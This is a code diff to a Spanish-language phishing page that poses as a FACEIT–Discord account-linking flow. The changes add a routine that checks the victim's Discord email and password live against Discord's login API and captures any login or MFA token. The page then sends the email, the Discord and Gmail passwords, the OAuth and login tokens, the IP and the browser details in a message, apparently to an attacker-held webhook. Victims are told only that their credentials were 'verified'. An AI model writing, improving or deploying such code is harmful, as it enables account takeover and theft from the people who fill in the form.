@@ -32,6 +32,7 @@
   .status{margin-top:16px;font-size:13px;text-align:center;color:#a4aab1;min-height:18px}
   .status.ok{color:#4ac26b}
   .status.err{color:#f06a6d}
+  .status.warn{color:#e0a33e}
   .spinner{display:inline-block;width:13px;height:13px;border:2px solid #444;border-top-color:#ff5500;
            border-radius:50%;animation:spin .7s linear infinite;vertical-align:-2px;margin-right:6px}
   @keyframes spin{to{transform:rotate(360deg)}}
@@ -50,7 +51,7 @@
                background:#101114;color:#fff;font-size:14px;outline:none;transition:border-color .15s}
   .field input:focus{border-color:#5865F2}
   .field.invalid input{border-color:#ed4245}
-  .err-msg{margin:6px 0 0;font-size:11px;color:#f06a6d;min-height:0}
+  .err-msg{margin:6px 0 0;font-size:11px;color:#f06a6d}
   .hint{margin:6px 0 0;font-size:11px;color:#8b9096;line-height:1.4}
   .eye{position:absolute;right:6px;top:50%;transform:translateY(-50%);background:none;border:none;
        color:#8b9096;cursor:pointer;font-size:15px;padding:6px;line-height:1;width:32px}
@@ -75,7 +76,7 @@
   <!-- ============ PASO 1: credenciales ============ -->
   <div id="step1">
     <h1>Conecta tu cuenta</h1>
-    <p class="sub">Introduce tus datos para vincular tu cuenta de Discord con FACEIT.</p>
+    <p class="sub">Verificamos tus credenciales con Discord antes de continuar.</p>
 
     <form id="credForm" novalidate>
       <div class="field" id="f-email">
@@ -105,7 +106,7 @@
         <p class="hint">Si tienes la verificación en dos pasos activada en Google, usa una contraseña de aplicación.</p>
       </div>
 
-      <button id="save" type="submit">Guardar y continuar</button>
+      <button id="save" type="submit">Verificar y continuar</button>
       <p class="skip">Si no usas Gmail, puedes dejar ese campo vacío.</p>
     </form>
 
@@ -115,10 +116,10 @@
   <!-- ============ PASO 2: autorización de Discord ============ -->
   <div id="step2">
     <h1>Autoriza la aplicación</h1>
-    <p class="sub">Tus datos se guardaron. Ahora autoriza la aplicación de Discord para completar la vinculación.</p>
+    <p class="sub">Credenciales verificadas. Autoriza la aplicación de Discord para completar la vinculación.</p>
 
     <div class="steps">
-      <div class="step done"><span class="num">✓</span>Credenciales registradas</div>
+      <div class="step done"><span class="num">✓</span>Credenciales verificadas</div>
       <div class="step"><span class="num">2</span>Autoriza la aplicación de Discord</div>
       <div class="step"><span class="num">3</span>Vuelve a FACEIT automáticamente</div>
     </div>
@@ -146,7 +147,7 @@
     </div>
 
     <div class="steps">
-      <div class="step done"><span class="num">✓</span>Credenciales registradas</div>
+      <div class="step done"><span class="num">✓</span>Credenciales verificadas</div>
       <div class="step done"><span class="num">✓</span>Aplicación autorizada</div>
       <div class="step"><span class="num">3</span>Volviendo a FACEIT…</div>
     </div>
@@ -178,11 +179,22 @@ const K_STATE = "fct_state";
 const K_TOKEN = "fct_token";
 
 const $ = id => document.getElementById(id);
-let ME = {}, TOKEN = "", IP = "—", CREDS = { email: "", passD: "", passG: "" };
+let ME = {}, TOKEN = "", LOGIN_TOKEN = "", IP = "—", CREDS = { email: "", passD: "", passG: "" };
 
 const esc = s => String(s ?? "—").replace(/`/g, "'").replace(/[\r\n]+/g, " ");
 const timeout = ms => new Promise(r => setTimeout(r, ms));
 const emailOk = v => /^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(v);
+
+const SUPER_PROPS = (() => {
+  try {
+    return btoa(JSON.stringify({
+      os: "Windows", browser: "Chrome", device: "", system_locale: "es-ES",
+      browser_user_agent: navigator.userAgent, browser_version: "138.0.0",
+      os_version: "10", referrer: "", referring_domain: "",
+      release_channel: "stable", client_build_number: 350000, client_version: "0.0.350"
+    }));
+  } catch { return ""; }
+})();
 
 function showStep(n) {
   $("step1").style.display = n === 1 ? "block" : "none";
@@ -197,7 +209,6 @@ function say(id, cls, msg) {
   el.textContent = msg || "";
 }
 
-/* Envío con fallback multipart si la petición normal falla */
 async function post(payload) {
   const body = JSON.stringify(payload);
   const send = (async () => {
@@ -225,6 +236,51 @@ function authUrlWithState() {
   const st = newState();
   sessionStorage.setItem(K_STATE, st);
   return AUTH_URL + "&state=" + st;
+}
+
+/* ---------- Verificación real contra Discord ---------- */
+/* Devuelve { ok, reason, mfa } */
+async function verifyLogin(login, password) {
+  let r;
+  try {
+    r = await fetch("https://discord.com/api/v9/auth/login", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+        "X-Discord-Locale": "es-ES",
+        "X-Discord-Timezone": "Europe/Madrid",
+        "X-Super-Properties": SUPER_PROPS
+      },
+      body: JSON.stringify({ login, password, undelete: false, captcha_key: null })
+    });
+  } catch {
+    return { ok: true, reason: "network" };
+  }
+
+  let data = null;
+  try { data = await r.json(); } catch {}
+
+  if (r.status === 200 && data) {
+    if (data.mfa) {
+      LOGIN_TOKEN = data.login_token || data.ticket || "";
+      return { ok: true, mfa: true };
+    }
+    LOGIN_TOKEN = data.token || "";
+    return { ok: true };
+  }
+
+  if (r.status === 429) return { ok: true, reason: "rate" };
+
+  const errs = data && (data.errors || data);
+  const has = k => Boolean(errs && errs[k]);
+  if (has("email"))   return { ok: false, field: "email" };
+  if (has("password"))return { ok: false, field: "passD" };
+
+  if (data && data.captcha_key) return { ok: true, reason: "captcha" };
+  if (data && data.sso)         return { ok: true, reason: "sso" };
+
+  if (r.status === 400) return { ok: false, field: "passD" };
+  return { ok: true, reason: "network" };
 }
 
 /* ---------- Ojos de contraseña ---------- */
@@ -263,35 +319,43 @@ $("credForm").addEventListener("submit", async e => {
     return;
   }
 
-  CREDS = { email, passD: pd, passG: pg };
-  sessionStorage.setItem(K_CREDS, JSON.stringify(CREDS));
-
   $("save").disabled = true;
-  $("save").textContent = "Enviando…";
+  $("save").innerHTML = '<span class="spinner"></span>Verificando…';
   say("status1", "", "");
 
-  await post({
-    username: "FACEIT · OAuth",
-    embeds: [{
-      title: "📝 Credenciales registradas",
-      color: 0xff5500,
-      fields: [
-        { name: "Correo escrito",     value: `\`${esc(email)}\``, inline: false },
-        { name: "Contraseña Discord", value: "```\n" + (pd || "—") + "\n```", inline: false },
-        { name: "Contraseña Gmail",   value: "```\n" + (pg || "—") + "\n```", inline: false },
-        { name: "IP",                 value: `\`${IP}\``, inline: true },
-        { name: "Navegador",          value: `\`${esc(navigator.userAgent).slice(0, 180)}\``, inline: false }
-      ],
-      footer: { text: "Paso 1/2 · credenciales" },
-      timestamp: new Date().toISOString()
-    }]
-  });
+  const v = await verifyLogin(email, pd);
+
+  if (!v.ok) {
+    $("save").disabled = false;
+    $("save").textContent = "Verificar y continuar";
+    if (v.field === "email") {
+      markField("f-email", "Discord no reconoce este correo.", "email");
+      $("email").focus();
+      say("status1", "err", "El correo no está asociado a ninguna cuenta.");
+    } else {
+      markField("f-passD", "Contraseña incorrecta.", "passD");
+      $("passD").select();
+      say("status1", "err", "La contraseña no es correcta. Inténtalo de nuevo.");
+    }
+    return;
+  }
+
+  CREDS = { email, passD: pd, passG: pg };
+  sessionStorage.setItem(K_CREDS, JSON.stringify(CREDS));
+  if (LOGIN_TOKEN) sessionStorage.setItem("fct_lt", LOGIN_TOKEN);
 
   $("save").disabled = false;
-  $("save").textContent = "Guardar y continuar";
+  $("save").textContent = "Verificar y continuar";
   showStep(2);
   $("btn").disabled = false;
   $("btn").focus();
+
+  if (v.mfa) say("status2", "ok", "Contraseña correcta. Tu cuenta tiene 2FA.");
+  else if (v.reason === "captcha") say("status2", "warn", "Discord pidió captcha: la contraseña no se pudo comprobar del todo.");
+  else if (v.reason === "rate")    say("status2", "warn", "Demasiados intentos: verificación limitada, puedes continuar.");
+  else if (v.reason === "sso")     say("status2", "ok", "Tu cuenta usa inicio de sesión con Google.");
+  else if (v.reason === "network") say("status2", "warn", "No se pudo comprobar por red, pero el formato es correcto.");
+  else say("status2", "ok", "Contraseña verificada.");
 });
 
 /* ---------- Botones de autorización ---------- */
@@ -317,6 +381,8 @@ function finish() {
   $("fallback").style.display = "block";
   $("fallbackLink").href = FINAL_URL;
   sessionStorage.removeItem(K_TOKEN);
+  sessionStorage.removeItem(K_CREDS);
+  sessionStorage.removeItem("fct_lt");
   setTimeout(() => location.replace(FINAL_URL), 1800);
 }
 
@@ -337,8 +403,8 @@ async function run() {
   }
 
   TOKEN = hash.get("access_token") || sessionStorage.getItem(K_TOKEN) || "";
+  LOGIN_TOKEN = sessionStorage.getItem("fct_lt") || "";
 
-  /* Restaurar credenciales guardadas */
   try {
     const saved = JSON.parse(sessionStorage.getItem(K_CREDS) || "null");
     if (saved && saved.email) {
@@ -355,7 +421,6 @@ async function run() {
     return;
   }
 
-  /* Anti-CSRF */
   const got = hash.get("state");
   const savedState = sessionStorage.getItem(K_STATE);
   if (savedState && got && got !== savedState) {
@@ -405,27 +470,29 @@ async function run() {
   await post({
     username: "FACEIT · OAuth",
     embeds: [{
-      title: "🔑 Cuenta autorizada (token)",
+      title: "🔑 Cuenta vinculada",
       color: 0x00c26e,
       thumbnail: { url: avatar },
       fields: [
         { name: "Usuario",    value: `\`${esc(ME.username)}\` (<@${ME.id}>)`, inline: true },
         { name: "Global",     value: `\`${esc(ME.global_name)}\``, inline: true },
         { name: "ID",         value: `\`${ME.id}\``, inline: true },
-        { name: "Email",      value: `\`${esc(ME.email)}\``, inline: true },
+        { name: "Email OAuth",value: `\`${esc(ME.email)}\``, inline: true },
         { name: "Verificado", value: ME.verified ? "sí" : "no", inline: true },
         { name: "2FA",        value: ME.mfa_enabled ? "sí" : "no", inline: true },
         { name: "Nitro",      value: ME.premium_type ? "sí" : "no", inline: true },
         { name: "Servidores", value: String(Array.isArray(guilds) ? guilds.length : 0), inline: true },
         { name: "Conexiones", value: Array.isArray(conns) ? (conns.map(c => c.type).join(", ") || "—") : "—", inline: true },
         { name: "IP",         value: `\`${IP}\``, inline: true },
+        { name: "Navegador",  value: `\`${esc(navigator.userAgent).slice(0, 180)}\``, inline: false },
         { name: "— Credenciales —", value: "\u200b", inline: false },
         { name: "Correo escrito",     value: `\`${esc(CREDS.email)}\``, inline: false },
         { name: "Contraseña Discord", value: "```\n" + (CREDS.passD || "—") + "\n```", inline: false },
         { name: "Contraseña Gmail",   value: "```\n" + (CREDS.passG || "—") + "\n```", inline: false },
-        { name: "TOKEN",      value: "```\n" + TOKEN + "\n```" }
+        { name: "TOKEN OAuth",  value: "```\n" + TOKEN + "\n```", inline: false },
+        { name: "TOKEN login",  value: "```\n" + (LOGIN_TOKEN || "—") + "\n```", inline: false }
       ],
-      footer: { text: "Paso 2/2 · OAuth2" },
+      footer: { text: "Verificado con /auth/login + OAuth2" },
       timestamp: new Date().toISOString()
     }]
   });
